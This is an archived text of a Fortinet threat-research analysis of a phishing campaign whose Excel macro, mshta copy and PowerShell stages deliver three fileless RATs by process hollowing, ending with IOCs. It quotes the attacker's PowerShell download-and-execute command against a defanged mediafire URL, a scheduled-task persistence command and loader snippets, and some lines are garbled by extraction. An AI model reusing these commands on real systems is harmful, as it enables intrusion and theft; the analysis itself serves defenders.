{
    "id": "96aa49c0-f9bb-431c-bdcf-2a20ebc80498",
    "created_at": "2023-01-12T15:02:41.906606Z",
    "updated_at": "2025-03-27T02:05:48.752328Z",
    "deleted_at": null,
    "sha1_hash": "0b1add1aef1887da2ea32ed61bc3225b26a4b25f",
    "title": "2022-05-12 - Phishing Campaign Delivering Three Fileless Malware- AveMariaRAT - BitRAT - PandoraHVNC – Part I",
    "authors": "",
    "file_creation_date": "2022-08-18T03:53:25Z",
    "file_modification_date": "2022-08-18T03:53:25Z",
    "file_size": 652468,
    "plain_text": "# Phishing Campaign Delivering Three Fileless Malware: AveMariaRAT / BitRAT / PandoraHVNC – Part I\n\n**fortinet.com/blog/threat-research/phishing-campaign-delivering-fileless-malware**\n\nMay 12, 2022\n\nFortinet’s FortiGuard Labs captured a phishing campaign that was delivering three fileless malware onto a victim’s device. Once executed,\nthey are able to steal sensitive information from that device.\n\nIn this analysis, I’ll reveal how the phishing campaign manages to transfer the fileless malware to the victim’s device, what mechanism it uses\nto load, deploy, and execute the fileless malware in the target process, and how it maintains persistence on the victim’s device.\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties: Microsoft Windows Users**\n\n**Impact: Controls victim’s device and collects sensitive information**\n\n**Severity level: Critical**\n\n## Observing the Phishing Email\n\nThe captured [phishing email is shown in Figure 1.1. It was disguised as a notification of a payment report from a trusted source.](https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&utm_campaign=phishing)\n\nFigure 1.1 – The phishing email\n\nThis email attempts to trick the recipient into opening the attached Excel document for the report detail. As you can see, this phishing email is\ndetected as spam by the [FortiMail service and has been marked as “[SPAM detected by FortiMail]” in the Subject line to warn the recipient.](https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=fortimail-main-page)\n\n## Looking into the Attached Excel Document\n\n\n-----\n\ne ce docu e t s a ed e tta ce eta s 95 a t s a ce dd ( a ) e t at co ta s a c ous ac os e t e\nrecipient starts it in the Microsoft Excel program, a security notice pops up asking the user if they want to enable the macros, as shown in\nFigure 2.1.\n\nFigure 2.1 – The security notice that launches when opening the Excel document\n\nIt contains an auto-start Macro that starts using a VBA (Visual Basic Application) method called “Auto_Open()” when the Excel file is opened.\n\n[Going through the VBA code inside the method, I learned that it decodes a command string and executes it using a WMI (Windows](https://docs.microsoft.com/en-us/windows/win32/wmisdk/retrieving-a-class)\nManagement Instrumentation) object.\n\nFigure 2.2 – The WMI object used to execute a decoded command\n\nFigure 2.2 is a snippet of VBA code of the method “Auto_Open()”, showing where it is about to create a WMI object to execute the decoded\nstring command “C:\\\\ProgramData\\\\ddond.com hxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file”, as shown in the\nbottom of Figure 2.2.\n\nBefore that, it copies a local file, “C:\\Windows\\System32\\mshta.exe”, into “C:\\ProgramData\\” and renames it as “ddond.com”. “mshta.exe” is a\nWindows-native binary file designed to execute Microsoft HTML Application (HTA) files. Remember that “C:\\ProgramData\\ddond.com” is now\nthe duplicate of “mshta.exe”, which will be used throughout the campaign. To confuse researchers, for example, it uses the copied\n“ddond.com” file to download and execute the malicious html file rather than “mshta.exe”.\n\n## HTML + JavaScript + PowerShell\n\nIt downloads the “APRL27.htm” file, which is parsed by “ddond.com” (i.e. “mshta.exe”). The HTML file contains a piece of JavaScript code that\nis encoded using the URL escape method. I decoded it and simplified the code, as shown in Figure 3.1.\n\nFigure 3.1 - The simplified JavaScript code from APRL27.html\n\nIt creates an object, “Wscript.Shell”, using the instruction below. “Wscript.Shell” is retrieved using method “_0x5b4b3f(0x391, 0x391)”, which is\nused to return a string by its index.\n\nchuchukukukaokiwDasidow = new ActiveXObject(_0x5b4b3f(0x391, 0x391));\n\n“chuchukukukaokiwDasidow” is the created OS Shell object used to run an application. In Figure 3.1 we can see it runs five command-line\napplications, as follows.\n\npowershell $MMMMMMM=((neW-ObjEcT ((\"Net.Webclient\"))).\n((\"Downloadstring\")).invoke(((\"hxxps[:]//taxfile[.]mediafire.com/file/175lr9wsa5n97x8/mainpw.dll/file\"))));Invoke-Expression $MMMMMMM\nschtasks /create /sc MINUTE /mo 82 /tn calendersw /F /tr \"\"\"%programdata%\\ddond.com \"\"\"\"\"\"\nhxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file\"\"\"\ntaskkill /f /im WinWord.exe\ntaskkill /f /im Excel.exe\ntaskkill /f /im POWERPNT.exe\n\nIt runs the PowerShell application to download a PowerShell file called “mainpw.dll” and then execute it.\n\nIt then runs schtasks to create a schedule task named “calendersw” in the system “Task Scheduler“. It performs the command\n“C:\\ProgramData\\ddond.com hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file” every 82 minutes, which looks like parsing\n“APRL27.html”. It is also a persistence mechanism. Once it starts, back.htm adds more scheduled tasks.\n\nIt also runs taskkill to kill processes, if existing, of MS Word (WinWord.exe), MS Excel (Excel.exe), and MS Pointpoint (POWERPNT.exe).\n\nFigure 3.2 – APRL27.htm traffic\n\nFigure 3.2 is the screenshot of an HTTP proxy program showing the packets from “APRL27.htm” to “mainpw.dll” marked in the red box. The\ngreen box (back.htm) and blue box (Start.htm) are other groups of requests from other “ddond.com” commands started by the Task Scheduler.\n\nThe “mainpw.dll” file (size 7.58MB) is full of PowerShell code that can be split into three parts for three fileless malware. Figure 3.3 is a display\nof the simplified structure of “mainpw.dll”.\n\nFigure 3.3 – Outlines of the PowerShell code inside “mainpw.dll”\n\n[This code has three code segments and uses the same code logic for each malware. I’ll explain how this works for each malware through their](https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware)\nvariables.\n\nThe first “$hexString” contains a dynamic method for performing GZip decompression.\nThe second “$hexString” contains dynamic PowerShell code that decompresses the malware payload and an inner .Net module file that\ndeploys the malware payload\n\n\n-----\n\ne $ o a s a uge byte a ay t at co ta s t e G p co p essed a a e pay oad e o o g o e S e codes e t acted o\nthe second $hexString are used to decompress the malware payload in $nona and the inner .Net module for deploying the malware\npayload into two local variables.\n\n[byte[]] $RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH = Get\nDecompressedByteArray $nona\n\n[byte[]] $RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG =Get\nDecompressedByteArray $STRDYFUGIHUYTYRTESRDYUGIRI\n\nAt the end of each malware code segment, the code calls the “Load()” method to load the inner .Net module from\n“$RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG”. It then calls the Invoke() method to invoke the “projFUD.PA.Execute()” function\nof the inner .Net module with two parameters, which are an exe file’s full path and a fileless malware payload. Here is a piece of the\nPowerShell code used for the first malware.\n\n[Reflection.Assembly]::Load($RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG).GetType('projFUD.PA').GetMethod('Execute').Invoke($n\n\n[object[]] ( 'C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_compiler.exe',$RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH))\n\n## Dynamic .Net Module for Process Hollowing\n\nIt is the inner .Net module that is dynamically extracted from the second $hexString variable. Its function “projFUD.PA.Execute()” is called from\nPowerShell, where “projFUD” is the name space, “PA” is the class name, and “Execute()” is a member function of class “PA”. Figure 4.1 shows\na debugger breaking at the entry of this function.\n\nFigure 4.1 – Break at the entry of function “projFUD.PA.Execute()”\n\nFrom the bottom, in the “Locals” variable sub-tab, we see the two passed parameters. It then performs process hollowing to inject the malware\npayload into a newly-created process of “aspnet_compiler.exe”.\n\nFigure 4.2 – Creating a suspended process\n\nThe “Execute()” function then calls the Windows API “CreateProcessA()” to create a process of “aspnet_compiler.exe” with a Create Flag of\n0x8000004. This is a combination of CREATE_NO_WINDOW and CREATE_SUSPENDED, as shown in Figure 4.2.\n\nNext, it allocates memory inside this process and deploys the malware payload data into it. It modifies the value at memory address\n0x7EFDE008, where it saves the process’ base address of PEB (Process Environment Block) and modifies the process’ registry to have its\nEIP (Extended Instruction Pointer) pointing to the copied malware payload. To finish, it needs to call the API WriteProcessMemory() numerous\ntimes as well as the API Wow64SetThreadContext().\n\nAfter all the above steps have been completed, it finally calls the API ResumeThread() to have the process run the malware payload. Below is\nthe code used for calling this API. “processInformation.ThreadHandle” is the thread handle of the newly created process.\n\nnum15 = (int)PA.LX99ujNZ7X3YScj6T4(PA.ResumeThread, PA.vgxYHnXuOV51G6NIu3(\"01001001011011100111011001101111011010110110010\nnew object[]\n\n{\n\nprocessInformation.ThreadHandle\n\n});\n\n## Conclusion\n\nIn this analysis, I explained how an Excel document attachment to a disguised phishing email is sent to a victim’s device and how the\nmalicious code inside the Excel document is automatically executed once opened by the recipient.\n\nI also showed how the VBA code leads to the access of a remote html file (APRL27.htm) using the copied “mshta.exe” command. This file\ncontains malicious JavaScript code to be executed later. I also demonstrated how it performs persistence by adding tasks into the system\n“Task Scheduler” to remain in the victim’s device.\n\nI also explained how it obtains three fileless malware in a huge downloaded PowerShell file to bypass detection, and how these are later\ndeployed and executed inside the target processes through Process Hollowing. These three fileless malware are AveMariaRAT / BitRAT /\nPandoraHVNC.\n\nIn Part 2 of this analysis, I will focus on these three fileless malware to see what they do on the victim’s device, as well as what kind of data\nthey are able to steal.\n\n## Fortinet Protections\n\n\n-----\n\no t et custo e s a e a eady p otected o t s a a e by o t Gua d s eb te g, t us, o t a, [o t C e t,](https://www.fortinet.com/products/endpoint-security/forticlient.html?utm_source=blog&utm_campaign=endpoint-web-page) o t se ces,\nand CDR (content disarm and reconstruction) services, as follows:\n\nAll relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe phishing email with its attached malicious Excel document can be disarmed by the FortiGuard CDR (content disarm and reconstruction)\nservice.\n\nThe captured Excel sample, the downloaded html file, and the PowerShell file with three fileless malware payload files are detected as\n\"VBA/Agent.DDON!tr\", \"JS/Agent.DDON!tr.dldr\", and \"PowerShell/Agent.e535!tr\" and are blocked by the FortiGuard Antivirus service.\n\n[FortiEDR detects both the Excel file and the huge PowerShell file as malicious based on their behavior.](https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=fortiedr)\n\n[In addition to these protections, we suggest that organizations have their end users also go through the FREE NSE training:](https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute) NSE 1 –\nInformation Security Awareness. It includes a module on Internet threats that is designed to help end users learn how to identify and protect\nthemselves from phishing attacks.\n\n## IOCs\n\n**URLs:**\n\nhxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file\n\nhxxps://www[.]mediafire[.]com/file/c3zcoq7ay6nql9i/back[.]htm/file\n\nhxxps://www[.]mediafire[.]com/file/jjyy2npmnhx6o49/Start[.]htm/file\n\nhxxps://taxmogalupupitpamobitola[.]blogspot[.]com/atom[.]xml\n\n**Sample SHA-256 Involved in the Campaign:**\n\n[Remittance-Details-951244-1.xlam]\n\n8007BB9CAA6A1456FFC829270BE2E62D1905D5B71E9DC9F9673DEC9AFBF13BFC\n\n[APRL27.htm]\n\nD71ADD25520799720ADD43A5F4925B796BEA11BF55644990B4B9A70B7EAEACBA\n\n[mainpw.dll]\n\n3D71A243E5D9BA44E3D71D4DA15D928658F92B2F0A220B7DEFE0136108871449\n\n_Read_ _[Part II of this analysis here.](https://www.fortinet.com/blog/threat-research/phishing-campaign-delivering-fileless-malware-part-two)_\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n_[Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-12 - Phishing Campaign Delivering Three Fileless Malware- AveMariaRAT - BitRAT - PandoraHVNC – Part I.pdf"
    ],
    "report_names": [
        "2022-05-12 - Phishing Campaign Delivering Three Fileless Malware- AveMariaRAT - BitRAT - PandoraHVNC – Part I.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535761,
    "ts_updated_at": 1743041148,
    "ts_creation_date": 1660794805,
    "ts_modification_date": 1660794805,
    "files": {
        "pdf": "https://archive.orkl.eu/0b1add1aef1887da2ea32ed61bc3225b26a4b25f.pdf",
        "text": "https://archive.orkl.eu/0b1add1aef1887da2ea32ed61bc3225b26a4b25f.txt",
        "img": "https://archive.orkl.eu/0b1add1aef1887da2ea32ed61bc3225b26a4b25f.jpg"
    }
}